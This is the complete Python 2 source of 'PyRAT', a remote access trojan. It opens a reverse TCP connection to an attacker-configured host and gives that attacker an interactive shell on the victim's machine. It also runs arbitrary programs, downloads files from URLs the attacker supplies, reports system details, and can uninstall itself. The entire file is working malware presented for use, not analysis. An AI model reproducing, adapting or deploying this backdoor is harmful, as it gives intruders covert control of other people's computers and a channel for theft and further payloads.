#!/bin/python

#Author: MR_NOP

import subprocess
import platform
import urllib2
import urllib
import socket
import ctypes
import shutil
import sys
import os

# Public variables
host = '127.0.0.1'   # Attackers IP-Address or DynDNS (Reverse Connection)
port = 4433          # Port where the backdoor connect to
prompt = '>>> '      # The default chars on the prompt
shell_mode = False   # Is the shell activated or not
whoami = ''          # Current username
ip = ''              # Local IP-Address
pcos = platform.system()            # Current Operating System
hostaddr = 'localhost'   # Victims IP-Address (DNS, DynDNS or IP)

# Function to get all PC-Informations as a string
def GetInformations():
	info = "***** PC Informations *****" + "\r\n"
	info += "Username......: " + whoami + "\r\n"
	info += "Network Name..: " + platform.node() + "\r\n"
	info += "Machine.......: " + platform.machine() + "\r\n"
	info += "Release.......: " + platform.release() + "\r\n"
	info += "OS............: " + pcos + "\r\n"
	info += "Version.......: " + platform.version() + "\r\n"
	info += "IP-Address....: " + ip + "\r\n"
	info += "Local-IP......: " + socket.gethostbyname(socket.gethostname()) + "\r\n"
	info += "\r\n***** Python Informations *****" + "\r\n"
	info += "Build.........: Number: " + platform.python_build()[0] + " Date: " + platform.python_build()[1] + "\r\n"
	info += "Compiler......: " + platform.python_compiler() + "\r\n"
	info += "Librarys......: " + platform.python_implementation() + "\r\n"
	info += "Version.......: " + platform.python_version() + "\r\n\r\n"
	return info

# Remote shell function
def Shell(conn, cmd):
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Handle
	output = proc.stdout.read() + proc.stderr.read() # Get output from handle
	conn.send(output + '\r\n') # Send output to attacker

# Command handling function
def UseCommand(conn, cmd):
	cmd = cmd.replace(' ', '') # Replace all empty spaces because we dont need them
	if cmd == '': # If command is empty we return nothing
		return
	if cmd == 'uninstall': # Command to uninstall the backdoor (If the backdoor runs still as python script, it will be deleted)
		try:
			conn.send('Are you sure?([y]es,[n]o): ') # Ask before you decide
			result = conn.recv(1024)                 # Get Result (yes or no)
			result = result.replace('\n', '').replace('\r', '') # Replace all newlines
			if result == 'y' or result == 'yes':
				conn.send('Uninstalled.\r\n\r\n')
				try:
					os.remove(sys.argv[0]) # Delete the backdoor python script
				except Exception: # If something went wrong, nothing will happen
					pass
				finally:
					exit()
			else:
				conn.send('Canceled.\r\n\r\n') # Cancel the uninstallation
				return
		except Exception:
			return
		return
	if cmd == 'run': # Command to run a program on background (Do not run a program using the command prompt!!!)
		try:
			conn.send('Program: ')                                 # ----
			result = conn.recv(1024)                               #|
			result = result.replace('\n', '').replace('\r', '')    #|    Ask you which program you want to start
			subprocess.Popen(result)                               #|
			conn.send('\r\n')                                      # ----
		except Exception:
			return
		return
	if cmd == 'quit' or cmd == 'exit': # Command to close the connection (It will not destroy the backdoor, it runs still on background)
		conn.send('Goodbye.\r\n')
		raise Exception
	if cmd == 'info': # Command to call the GetInformations() function to get all PC-Informations
		info = GetInformations() # Get PC-Informations as string (Look at the bottom)
		conn.send(info) # Send PC-Informations to the attacker
		return
	if cmd == 'clear' or cmd == 'cls': # Command to clear the prompt screen (Only works on linux)
		if pcos == 'Windows': # Check if system runs on Windows
			conn.send('Error: Command is not for Windows\r\n\r\n') # Send error message
			return
	
		proc = subprocess.Popen('clear', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Get clear screen handle
		bcmd = proc.stdout.read() + proc.stderr.read() # Get output from handle
		conn.send(bcmd) # Send handle output (If attackers machine is running on Linux as well, the terminal screen will be cleared)
		return
	if cmd == 'banner': # Command to get the bautyful banner
		conn.send('PyRAT 1.1.1a Client (PyRAT) @ MR_NOP [' + ip + ']\r\nType \"help\" for more informations.\r\n\r\n') # Send banner
		return
	if cmd == 'help': # Command to display all commands for PyRat
		helpstr = ""                                                                 # ---
		helpstr += "help.......................Display this help" + "\r\n"           #|
		helpstr += "banner.....................Display the banner" + "\r\n"          #|
		helpstr += "info.......................Display pc informations" + "\r\n"     #|
		helpstr += "download...................Download file from url" + "\r\n"      #|    Saving "help" out to a string
		helpstr += "run........................Run a program" + "\r\n"               #|
		helpstr += "shell......................Open a remote shell" + "\r\n"         #|
		helpstr += "clear/cls..................Clear the screen" + "\r\n"            #|
		helpstr += "exit/quit..................Disconnect from backdoor" + "\r\n"    #|
		helpstr += "uninstall..................Uninstall the backdoor" + "\r\n\r\n"  # ---
		conn.send(helpstr) # Send help
		return
	if cmd == 'download': # Command to download a file from url
		try:
			conn.send('URL: ') # Asking for Download-URL
			url = conn.recv(1024) # Get Download-URL
			url = url.replace('\n', '').replace('\r', '') # Replace all newlines from url
			if not (url.startswith('http://') or url.startswith('https://')): # If URL doesn't start with "http://" of "https://"
				url = 'http://' + url # Put "http://" into URL string
			file_name = url.split('/')[-1] # Get file name from URL ==> Example: http://www.file.com/test.exe == Split('/') ==> http:www.file.comtest.exe
			                               #                                     http://www.file.com/test.exe == Split('/')[-1] (-1 means reverse) ==> test.exe                                                       
			if pcos == 'Windows': # If victims machine runs on Windows, just download the file
				testfile = urllib.URLopener()      # Open the URL
				testfile.retrieve(url, file_name)  # Receive file from URL
			else: # If victims machine runs on Linux, download the file with progressbar
				u = urllib2.urlopen(url) # Open URL
				f = open(file_name, 'wb') # Open binary file stream
				meta = u.info() # Get meta informations from URL
				file_size = int(meta.getheaders("Content-Length")[0]) # Get file size
				conn.send("Downloading: " + str(file_name) + " Bytes: " + str(file_size)) # Send filename and file size to attacker

				file_size_dl = 0
				block_sz = 8192
				while True: # Start the download
					buffer = u.read(block_sz)
					if not buffer: # If buffer is empty (Which means file is downloaded) then break the loop
						break

					file_size_dl += len(buffer) # Get current received buffer
					f.write(buffer) # Write bytes into a binary file
					status = r"%10d [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size) # Get download status and save it into a string
					#status = status + chr(8)*(len(status)+1) # Overwrite current line
					conn.send(str(status) + '\r\n') # Send current status

				f.close()
			
			conn.send('File Name: ' + file_name + "\r\n")
			conn.send('Done.\r\n\r\n')
		except Exception: # If something went wrong, send a error message
			conn.send("Error: Cannot Download File.\r\n\r\n")
			return
		return

	conn.send('pyrat: ' + cmd + ': Command was not found.\r\n\r\n') # No command was found

# Main backdoor loop
while True:
	try:
		proc = subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # ---
		whoami = proc.stdout.read() + proc.stderr.read()                                                                      #|   Get current username and save it into a string
		whoami = whoami.replace('\n', '').replace('\r', '')                                                                   # ---
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket (TCP/IP)
		ip = socket.gethostbyname(hostaddr) # Get IP-Address from DNS or DynDNS and save it into a string
	except Exception:
		continue
	while True: # Connecting loop
		try:
			s.connect((host, port)) # Connect to the attacker
			s.send('PyRAT 1.1.1a Client (PyRAT) @ MR_NOP [' + ip + ']\r\nType \"help\" for more informations.\r\n\r\n') # Sending banner as intro
			break
		except Exception: # If the backdoor cannot connect to the attacker, then try it again
			continue
	while True:
		try:
			s.send(prompt) # Sending prompt chars
			data = s.recv(1024) # Receive backdoor command
			data = data.replace('\n', '').replace('\r', '') # Replace all newlines

			if shell_mode == False: # If the attacker is not using the remote shell
				if data == 'shell': # Then check if the attacker want to activate the remote shell
					prompt = str(whoami) + '@~' + os.getcwd() + '# ' # Changing prompt chars to shell prompt (UNIX like)
					shell_mode = True # Set shell mode equals "True", so the next command will be also a shell command
					continue # Go back to the prompt line (Shell Prompt this time)

			if shell_mode == True: # If the attacker is using the remote shell, then only check the command in this "if block"
				if data == 'exit' or data == 'quit': # The attacker dont want to use the remote shell anymore
					shell_mode = False # Set shell mode equal "False", so the next command will be not a shell command, it will be a PyRat command
					prompt = '>>> ' # Set prompt chars to default
					continue # Go back to the prompt line
				if data == '': # If command was empty, then go back and do nothing
					prompt = str(whoami) + '@~' + os.getcwd() + '# '
					continue
				if data.startswith('cd '): # Attacker wants to change the directory with "cd "
					data = data.replace('cd ', '') # Replace "cd " so we only have the path where the attacker wants to move to
					try:
						os.chdir(data) # Trying to change directory
					except Exception:
						pass # If something went wrong do nothing
					prompt = str(whoami) + '@~' + os.getcwd() + '# '
					continue
				else: # If no of these commands can be used, then just use the command as shell command
					prompt = str(whoami) + '@~' + os.getcwd() + '# ' 
					Shell(s, data) # Function to send shell output
			else:
				prompt = '>>> '
				UseCommand(s, data) # Function to send PyRat command output
		except Exception, e: # If the attacker closed the connection, then try to connect to the attacker again
			prompt = '>>> ' # Set prompt chars to default
			shell_mode = False # Turn the shell mode off
			print str(e) # Print the error message
			break # Go back to the connecting loop
